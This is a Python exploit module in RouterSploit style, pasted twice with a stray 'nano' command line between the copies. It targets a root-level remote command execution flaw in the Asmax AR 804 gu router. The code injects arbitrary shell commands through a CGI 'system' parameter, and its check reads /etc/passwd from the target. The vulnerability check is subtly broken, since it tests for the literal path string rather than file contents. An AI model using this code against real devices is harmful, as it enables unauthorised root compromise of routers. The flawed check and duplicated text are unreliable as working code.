# rsf exploit module
# description: Module exploits Asmax AR 804 Remote Code Execution vulnerability which allows executing command on operating system level with root privileges.

from requests import get  # Use normal libraries

class Exploit:
    __info__ = {
        "name": "Asmax AR 804 RCE",
        "description": "Module exploits Asmax AR 804 Remote Code Execution vulnerability which "
                       "allows executing command on operating system level with root privileges.",
        "authors": (
            "Michal Sajdak <michal.sajdak[at]securitum.com>",  # vulnerability discovery
            "Marcin Bury <marcin[at]threat9.com>",  # routersploit module
        ),
        "references": (
            "http://www.securitum.pl/dh/asmax-ar-804-gu-compromise",
            "https://www.exploit-db.com/exploits/8846/",
        ),
        "devices": (
            "Asmax AR 804 gu",
        ),
    }

    def __init__(self, target, port=80):
        self.target = target
        self.port = port

    def run(self):
        print("Checking if target is vulnerable")

        if self.check():
            print("Target is vulnerable")
            print("Invoking command loop...")
            # You can handle the shell separately in another script
        else:
            print("Exploit failed - target seems to be not vulnerable")

    def execute(self, cmd):
        url = f"http://{self.target}:{self.port}/cgi-bin/script?system%20{cmd}"
        response = get(url)
        if response.status_code != 200:
            return ""
        return response.text

    def check(self):
        cmd = "cat /etc/passwd"
        url = f"http://{self.target}:{self.port}/cgi-bin/script?system%20{cmd}"

        response = get(url)
        if response.status_code != 200:
            return False  # target is not vulnerable

        if "/etc/passwd" in response.text:
            return True  # target is vulnerable

        return False  # target is not vulnerable
nano Asmax_AR804_RCE.py
# rsf exploit module
# description: Module exploits Asmax AR 804 Remote Code Execution vulnerability which allows executing command on operating system level with root privileges.

from requests import get  # Use normal libraries

class Exploit:
    __info__ = {
        "name": "Asmax AR 804 RCE",
        "description": "Module exploits Asmax AR 804 Remote Code Execution vulnerability which "
                       "allows executing command on operating system level with root privileges.",
        "authors": (
            "Michal Sajdak <michal.sajdak[at]securitum.com>",  # vulnerability discovery
            "Marcin Bury <marcin[at]threat9.com>",  # routersploit module
        ),
        "references": (
            "http://www.securitum.pl/dh/asmax-ar-804-gu-compromise",
            "https://www.exploit-db.com/exploits/8846/",
        ),
        "devices": (
            "Asmax AR 804 gu",
        ),
    }

    def __init__(self, target, port=80):
        self.target = target
        self.port = port

    def run(self):
        print("Checking if target is vulnerable")

        if self.check():
            print("Target is vulnerable")
            print("Invoking command loop...")
            # You can handle the shell separately in another script
        else:
            print("Exploit failed - target seems to be not vulnerable")

    def execute(self, cmd):
        url = f"http://{self.target}:{self.port}/cgi-bin/script?system%20{cmd}"
        response = get(url)
        if response.status_code != 200:
            return ""
        return response.text

    def check(self):
        cmd = "cat /etc/passwd"
        url = f"http://{self.target}:{self.port}/cgi-bin/script?system%20{cmd}"

        response = get(url)
        if response.status_code != 200:
            return False  # target is not vulnerable

        if "/etc/passwd" in response.text:
            return True  # target is vulnerable

        return False  # target is not vulnerable
 
